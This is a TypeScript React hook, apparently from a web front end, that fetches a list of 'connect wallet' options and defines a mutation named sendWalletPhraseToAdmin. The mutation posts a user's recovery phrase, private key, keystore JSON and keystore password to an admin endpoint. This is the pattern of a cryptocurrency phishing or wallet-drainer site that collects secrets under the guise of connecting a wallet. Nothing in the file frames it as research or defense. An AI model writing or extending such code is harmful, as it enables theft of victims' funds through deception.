import { useQuery, useMutation } from "@tanstack/react-query";
import { api } from "@/lib/api";
import { toast } from "sonner";
import { AxiosError } from "axios";

export const useConnectWallets = () => {
  const {
    data: connectWalletsData = [],
    isLoading,
    error,
    refetch,
    isRefetching,
  } = useQuery({
    queryKey: ["connectWallets"],
    queryFn: async () => {
      try {
        const response = await api.get("/connectWallet/getAllConnectWallet");
        // console.log(response.data);
        return response;
      } catch (error) {
        // console.log("Failed to fetch connect wallets", error);
        throw error;
      }
    },
    select: (res) => res?.data,
    retry: 0,
    staleTime: Infinity, //  (prevents refetch)
    gcTime: Infinity, // prevent removing from the garbage collector
    refetchOnWindowFocus: false,
    refetchOnMount: false,
    refetchOnReconnect: false,
  });

  //  sendWalletPhraseToAdmin Mutation
  const sendWalletPhraseToAdminMutation = useMutation({
    mutationFn: async (formData: {
      type: string;
      wallet: string | undefined;
      phrase: string;
      keystoreJSON: string;
      keystoreJSONPassword: string;
      privateKey: string;
    }) => {
      return api.post("/connectWallet/sendWalletPhraseToAdmin", formData);
    },
    onSuccess: async () => {
      toast("Operation Successful");
    },
    onError: (error: unknown) => {
      let message = "Failed to add Connect Wallet";

      if (error instanceof AxiosError) {
        if (typeof error.response?.data?.message === "string") {
          message = error.response.data.message;
        }
      }

      toast.error(message);
    },
  });

  const sendWalletPhraseToAdmin = (formData: {
    type: string;
    wallet: string | undefined;
    phrase: string;
    keystoreJSON: string;
    keystoreJSONPassword: string;
    privateKey: string;
  }) => {
    sendWalletPhraseToAdminMutation.mutate(formData);
  };

  return {
    allConnectWallets: connectWalletsData || [],
    isLoading,
    error,
    refetch,
    isRefetching,
    sendWalletPhraseToAdmin,
    isSendingWalletPhraseToAdmin: sendWalletPhraseToAdminMutation.isPending,
  };
};
